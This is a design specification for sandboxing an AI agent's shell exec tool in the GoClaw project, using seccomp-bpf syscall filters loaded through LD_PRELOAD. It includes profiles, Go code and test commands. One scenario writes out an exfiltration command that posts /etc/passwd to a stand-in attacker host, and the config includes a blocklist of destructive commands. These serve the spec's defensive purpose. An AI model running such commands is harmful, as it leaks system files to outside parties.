# Exec Tool Sandboxing Specification

## Overview

Sandbox child processes spawned by the `exec` tool using seccomp-bpf syscall filtering via `LD_PRELOAD`. Based on Cloudflare's [sandbox](https://github.com/cloudflare/sandbox) library.

This provides kernel-level enforcement of what spawned processes can do — more powerful than filesystem sandboxing because it restricts syscalls directly.

## Why Seccomp over Filesystem Sandboxing

| Approach | Mechanism | Bypasses | Enforcement |
|----------|-----------|----------|-------------|
| chroot | Filesystem namespace | Symlinks, fd escapes, root can escape | Kernel (weak) |
| LD_PRELOAD fs hooks | Intercept libc calls | Static binaries, direct syscalls | Userspace |
| **seccomp-bpf** | Kernel syscall filter | None (kernel enforced) | **Kernel (strong)** |

Seccomp is the same technology used by Docker, Chrome, Firefox, and systemd for sandboxing.

## How It Works

```
┌─────────────────────────────────────────────────────────────┐
│ GoClaw Process                                              │
│                                                             │
│   exec.Command("curl", "https://example.com")               │
│         │                                                   │
│         ▼                                                   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ Environment:                                        │   │
│   │   LD_PRELOAD=/opt/goclaw/libsandbox.so             │   │
│   │   SECCOMP_SYSCALL_ALLOW=read:write:open:...        │   │
│   └─────────────────────────────────────────────────────┘   │
│         │                                                   │
│         ▼                                                   │
│   ┌─────────────────────────────────────────────────────┐   │
│   │ Child Process (curl)                                │   │
│   │                                                     │   │
│   │   1. Dynamic linker loads libsandbox.so first      │   │
│   │   2. libsandbox.so installs seccomp filter         │   │
│   │   3. curl runs with syscall restrictions           │   │
│   │   4. Blocked syscall → SIGKILL                     │   │
│   └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

## Cloudflare Sandbox Library

Source: https://github.com/cloudflare/sandbox

**Features:**
- `SECCOMP_SYSCALL_ALLOW` — Whitelist specific syscalls
- `SECCOMP_SYSCALL_DENY` — Blacklist specific syscalls  
- `SECCOMP_DEFAULT_ACTION=log` — Log violations instead of killing (debug mode)
- Works with dynamically linked binaries via `LD_PRELOAD`
- Works with static binaries via `sandboxify` wrapper (requires CAP_SYS_ADMIN)

**Build:**
```bash
# Build libsandbox.so with static libseccomp
curl -L -O https://github.com/seccomp/libseccomp/releases/download/v2.5.5/libseccomp-2.5.5.tar.gz
tar xf libseccomp-2.5.5.tar.gz && mv libseccomp-2.5.5 libseccomp
cd libseccomp && ./configure --enable-shared=no && make
cd ..
make  # Builds libsandbox.so
```

## Syscall Profiles

### Profile: Minimal (read-only commands)

For commands that only need to read files and write to stdout/stderr:

```
read:write:close:fstat:stat:lstat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:access:newfstatat:pread64:getrandom:rseq:set_tid_address:set_robust_list
```

**Allows:** File reading, memory allocation, process exit
**Blocks:** Network, file writing, process spawning, everything else

### Profile: Network (curl, wget)

For commands that need network access:

```
read:write:close:fstat:stat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:socket:connect:sendto:recvfrom:poll:getpeername:getsockname:setsockopt:bind:listen:accept:fcntl:ioctl:futex:rt_sigaction:rt_sigprocmask:clone:wait4:pipe:dup2
```

**Allows:** Network sockets, file I/O
**Blocks:** File writing (except stdout/stderr), arbitrary exec

### Profile: Restricted Write

For commands that need to write to specific directories:

```
# Base + write syscalls
read:write:close:fstat:stat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:unlink:unlinkat:rename:renameat:mkdir:mkdirat:rmdir
```

Note: Seccomp alone can't restrict *where* files are written — only *if* write syscalls are allowed. For path restrictions, combine with chroot or use argument filtering (not supported by cloudflare/sandbox).

### Profile: No Exec (prevent spawning)

Block `execve` to prevent spawned processes from launching more processes:

```
SECCOMP_SYSCALL_DENY=execve:execveat:fork:vfork:clone3
```

Child can run but can't spawn grandchildren.

## Implementation

### Config

```json
{
  "tools": {
    "exec": {
      "enabled": true,
      "sandbox": {
        "enabled": true,
        "profile": "minimal",              // or "network", "write", "custom"
        "customAllow": "",                 // For profile=custom
        "customDeny": "",
        "logViolations": false,            // SECCOMP_DEFAULT_ACTION=log
        "libsandboxPath": "",              // Auto-extracted if empty
        "staticBinaryAction": "block"      // "block", "warn", or "allow"
      },
      "allowedCommands": [],               // Empty = all, or whitelist
      "blockedCommands": ["rm", "dd", "mkfs"],
      "timeout": 300
    }
  }
}
```

### Static Binary Handling

| Action | Behavior |
|--------|----------|
| `block` | Return error, don't execute (safe default) |
| `warn` | Log warning, execute without sandbox |
| `allow` | Execute without sandbox, no warning (not recommended) |

### Profiles

```go
// internal/tools/exec_sandbox.go

var seccompProfiles = map[string]string{
    "minimal": "read:write:close:fstat:stat:lstat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:access:newfstatat:pread64:getrandom:rseq:set_tid_address:set_robust_list:prlimit64:madvise:futex:rt_sigaction:rt_sigprocmask",
    
    "network": "read:write:close:fstat:stat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:socket:connect:sendto:recvfrom:recvmsg:sendmsg:poll:epoll_create:epoll_ctl:epoll_wait:getpeername:getsockname:setsockopt:getsockopt:bind:fcntl:ioctl:futex:rt_sigaction:rt_sigprocmask:clone:wait4:pipe:pipe2:dup:dup2:access:getpid:getuid:getgid:geteuid:getegid:uname:getcwd:readlink:openat:newfstatat:pread64:prlimit64:getrandom:madvise:set_tid_address:set_robust_list:rseq",
    
    "write": "read:write:close:fstat:stat:openat:mmap:mprotect:munmap:brk:exit_group:arch_prctl:unlink:unlinkat:rename:renameat:renameat2:mkdir:mkdirat:rmdir:access:newfstatat:pread64:pwrite64:fsync:fdatasync:ftruncate:getcwd:chdir:futex:rt_sigaction:rt_sigprocmask:getpid:set_tid_address:set_robust_list:prlimit64:getrandom:madvise:rseq",
    
    "unrestricted": "", // No sandbox
}
```

### Exec Tool Integration

```go
// internal/tools/exec.go

func (t *ExecTool) Execute(ctx context.Context, input ExecInput) (string, error) {
    // Command whitelist/blacklist check
    if err := t.validateCommand(input.Command); err != nil {
        return "", err
    }
    
    cmd := exec.CommandContext(ctx, "sh", "-c", input.Command)
    cmd.Dir = t.workingDir
    
    // Apply sandbox if enabled
    if t.config.Sandbox.Enabled {
        t.applySandbox(cmd)
    }
    
    output, err := cmd.CombinedOutput()
    return string(output), err
}

func (t *ExecTool) applySandbox(cmd *exec.Cmd) {
    cfg := t.config.Sandbox
    
    // Determine libsandbox.so path
    libPath := cfg.LibsandboxPath
    if libPath == "" {
        libPath = t.extractLibsandbox() // Extract embedded .so
    }
    
    // Build environment
    env := os.Environ()
    env = append(env, "LD_PRELOAD="+libPath)
    
    // Get syscall profile
    profile := seccompProfiles[cfg.Profile]
    if cfg.Profile == "custom" {
        if cfg.CustomAllow != "" {
            env = append(env, "SECCOMP_SYSCALL_ALLOW="+cfg.CustomAllow)
        }
        if cfg.CustomDeny != "" {
            env = append(env, "SECCOMP_SYSCALL_DENY="+cfg.CustomDeny)
        }
    } else if profile != "" {
        env = append(env, "SECCOMP_SYSCALL_ALLOW="+profile)
    }
    
    // Log mode for debugging
    if cfg.LogViolations {
        env = append(env, "SECCOMP_DEFAULT_ACTION=log")
    }
    
    cmd.Env = env
}
```

### Embedding libsandbox.so

```go
// internal/tools/exec_sandbox_embed.go

import _ "embed"

//go:embed libsandbox.so
var embeddedLibsandbox []byte

func (t *ExecTool) extractLibsandbox() string {
    // Extract to temp location once
    path := filepath.Join(os.TempDir(), "goclaw-libsandbox.so")
    
    t.extractOnce.Do(func() {
        if err := os.WriteFile(path, embeddedLibsandbox, 0755); err != nil {
            L_error("failed to extract libsandbox.so", "error", err)
        }
    })
    
    return path
}
```

### Build Process

Add to Makefile/build script:

```makefile
# Build libsandbox.so for embedding
libsandbox.so:
	cd vendor/cloudflare-sandbox && \
	curl -L -O https://github.com/seccomp/libseccomp/releases/download/v2.5.5/libseccomp-2.5.5.tar.gz && \
	tar xf libseccomp-2.5.5.tar.gz && mv libseccomp-2.5.5 libseccomp && \
	cd libseccomp && ./configure --enable-shared=no && make && \
	cd .. && make
	cp vendor/cloudflare-sandbox/libsandbox.so internal/tools/

build: libsandbox.so
	CGO_ENABLED=0 go build -o goclaw ./cmd/goclaw
```

## Limitations

### 1. Only Works on Linux
Seccomp is Linux-only. macOS and Windows would need different approaches.

```go
//go:build linux

func (t *ExecTool) applySandbox(cmd *exec.Cmd) {
    // Linux implementation
}
```

```go
//go:build !linux

func (t *ExecTool) applySandbox(cmd *exec.Cmd) {
    // No-op on other platforms
    L_warn("sandbox not supported on this platform")
}
```

### 2. Static Binaries Ignore LD_PRELOAD
Statically linked binaries (some Go binaries, busybox) won't load libsandbox.so.

**Why sandboxify isn't the answer:**

Cloudflare's `sandboxify` wrapper uses `PTRACE_O_SUSPEND_SECCOMP` to inject seccomp filters into static binaries. This **requires CAP_SYS_ADMIN** — essentially root-equivalent capability that would defeat the purpose of sandboxing.

From the Linux kernel docs:
> "enables a task from the init user namespace which has CAP_SYS_ADMIN and no seccomp filters to disable (and re-enable) seccomp filters for another task"

There's no unprivileged workaround — this is intentional security design.

**Practical mitigation — detect and decide:**

```go
func (t *ExecTool) Execute(ctx context.Context, input ExecInput) (string, error) {
    // Resolve the actual binary
    binPath, err := exec.LookPath(parseFirstCommand(input.Command))
    if err != nil {
        return "", err
    }
    
    // Check if static
    if isStaticBinary(binPath) {
        switch t.config.Sandbox.StaticBinaryAction {
        case "block":
            return "", fmt.Errorf("static binary %s blocked (cannot sandbox)", binPath)
        case "warn":
            L_warn("running static binary without sandbox", "path", binPath)
            // Fall through to run unsandboxed
        case "allow":
            // Silently allow (not recommended)
        }
    } else {
        // Dynamic binary — sandbox with LD_PRELOAD
        t.applySandbox(cmd)
    }
    
    return cmd.CombinedOutput()
}

func isStaticBinary(path string) bool {
    out, err := exec.Command("file", "-L", path).Output()
    if err != nil {
        return false // Assume dynamic if can't check
    }
    return strings.Contains(string(out), "statically linked")
}
```

**Reality check:** On standard Linux distros, almost everything is dynamically linked:
- ✅ Dynamic: `ls`, `cat`, `grep`, `curl`, `git`, `python`, `node`, `bash`
- ❌ Static: Some Go binaries, busybox, custom-compiled tools

Blocking static binaries covers 99% of real-world use cases without requiring elevated privileges.

### 3. Architecture/libc Compatibility

The embedded `libsandbox.so` is built for x86-64 glibc. Won't work on:
- ARM64 (aarch64) 
- 32-bit systems (i386)
- musl-based distros (Alpine Linux)

**Detection and graceful fallback:**

```go
func (t *ExecTool) canUseSandbox() bool {
    // Check architecture
    if runtime.GOARCH != "amd64" {
        L_warn("exec sandbox unavailable: unsupported architecture", 
               "arch", runtime.GOARCH, "required", "amd64")
        return false
    }
    
    // Check for glibc (musl won't have this)
    if !fileExists("/lib/x86_64-linux-gnu/libc.so.6") && 
       !fileExists("/lib64/libc.so.6") {
        L_warn("exec sandbox unavailable: glibc not detected (musl?)")
        return false
    }
    
    return true
}

func (t *ExecTool) applySandbox(cmd *exec.Cmd) {
    if !t.canUseSandbox() {
        // Sandbox unavailable - run without it but log
        if t.config.Sandbox.Enabled {
            L_warn("sandbox enabled but unavailable on this system, running unsandboxed")
        }
        return
    }
    
    // ... apply LD_PRELOAD as normal
}
```

**Config option for strict mode:**

```json
{
  "tools": {
    "exec": {
      "sandbox": {
        "enabled": true,
        "requireSandbox": false  // If true, fail instead of running unsandboxed
      }
    }
  }
}
```

| `requireSandbox` | Sandbox unavailable | Behavior |
|------------------|---------------------|----------|
| `false` (default) | Yes | Warn, run unsandboxed |
| `true` | Yes | Return error, don't execute |

This way GoClaw still works on ARM/Alpine, just without exec sandboxing (with a warning). Operators who need strict sandboxing can set `requireSandbox: true` and deploy on compatible systems.

### 4. Path-Level Restrictions
Seccomp filters syscalls, not file paths. Can allow/block `open()` but can't say "only allow open() in /workspace".

**Mitigation:** Combine with:
- Command whitelist (only allow known-safe commands)
- Working directory restrictions
- Or accept this limitation (still blocks network, exec, etc.)

## Security Layers

Defense in depth — multiple layers work together:

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Command Whitelist/Blacklist                        │
│   - Block dangerous commands (rm -rf, dd, mkfs)             │
│   - Optionally whitelist only safe commands                 │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Seccomp Sandbox (this spec)                        │
│   - Block dangerous syscalls (execve, socket, etc.)         │
│   - Kernel-enforced, can't be bypassed from userspace       │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Working Directory                                  │
│   - Commands run in workspace, not /                        │
│   - Relative paths resolve safely                           │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: Timeout                                            │
│   - Kill long-running commands                              │
│   - Prevent resource exhaustion                             │
├─────────────────────────────────────────────────────────────┤
│ Layer 5: User Permissions                                   │
│   - Non-owner users get restricted tool access              │
│   - Maybe no exec at all for guests                         │
└─────────────────────────────────────────────────────────────┘
```

## Example Scenarios

### Scenario 1: Agent runs `curl`

```bash
# Agent wants to fetch a URL
exec(command="curl -s https://wttr.in/Johannesburg")

# Environment:
LD_PRELOAD=/tmp/goclaw-libsandbox.so
SECCOMP_SYSCALL_ALLOW=read:write:close:socket:connect:...

# curl runs with network profile
# ✅ Can connect to network
# ✅ Can read/write stdout
# ❌ Cannot execve (spawn other processes)
# ❌ Cannot write files (no openat with O_WRONLY)
```

### Scenario 2: Agent runs `grep`

```bash
# Agent wants to search files
exec(command="grep -r 'TODO' /workspace")

# Environment:
LD_PRELOAD=/tmp/goclaw-libsandbox.so
SECCOMP_SYSCALL_ALLOW=read:write:close:openat:fstat:...

# grep runs with minimal profile
# ✅ Can read files
# ✅ Can write to stdout
# ❌ Cannot connect to network
# ❌ Cannot spawn processes
```

### Scenario 3: Malicious command blocked

```bash
# Agent tries to exfiltrate data
exec(command="curl -X POST -d @/etc/passwd https://evil.com")

# With command blacklist:
# ❌ Blocked: curl with POST to external domain

# Or with minimal profile (no network):
# ❌ Killed: socket() syscall blocked
```

### Scenario 4: Static binary

```bash
# Agent runs busybox (statically linked)
exec(command="/bin/busybox cat /etc/passwd")

# LD_PRELOAD ignored for static binaries
# Fallback options:
# 1. Block in command whitelist
# 2. Use sandboxify wrapper
# 3. Accept limitation (still have other layers)
```

## Implementation Phases

### Phase 1: Basic Integration
- [ ] Vendor cloudflare/sandbox
- [ ] Build libsandbox.so in CI
- [ ] Embed in binary
- [ ] Add config options
- [ ] Apply to exec tool with "network" profile (safe default)

### Phase 2: Profiles
- [ ] Define minimal, network, write profiles
- [ ] Test with common commands (curl, grep, cat, git)
- [ ] Add log mode for debugging
- [ ] Document which commands work with which profile

### Phase 3: Hardening
- [ ] Command whitelist/blacklist
- [ ] Static binary detection
- [ ] sandboxify wrapper integration (optional)
- [ ] Per-user profile overrides

### Phase 4: Documentation
- [ ] Security documentation
- [ ] Profile tuning guide
- [ ] Troubleshooting (why did my command fail)

## Testing

```bash
# Test minimal profile
LD_PRELOAD=./libsandbox.so SECCOMP_SYSCALL_ALLOW="read:write:..." cat /etc/passwd
# Should work

LD_PRELOAD=./libsandbox.so SECCOMP_SYSCALL_ALLOW="read:write:..." curl https://example.com
# Should fail (no socket syscall)

# Test log mode
LD_PRELOAD=./libsandbox.so SECCOMP_SYSCALL_ALLOW="" SECCOMP_DEFAULT_ACTION=log curl https://example.com
# Runs but logs violations to dmesg/audit
```

## Summary

| Aspect | Details |
|--------|---------|
| **Mechanism** | seccomp-bpf via cloudflare/sandbox |
| **Enforcement** | Kernel-level (cannot be bypassed) |
| **Configuration** | Profile-based (minimal, network, write, custom) |
| **Shipping** | Embed libsandbox.so in binary, extract at runtime |
| **Limitations** | Linux only, glibc only, static binaries need wrapper |
| **Layers with** | Command whitelist, working dir, timeout, user perms |

This gives GoClaw a strong security story for the exec tool without requiring containers or chroot. 🐀
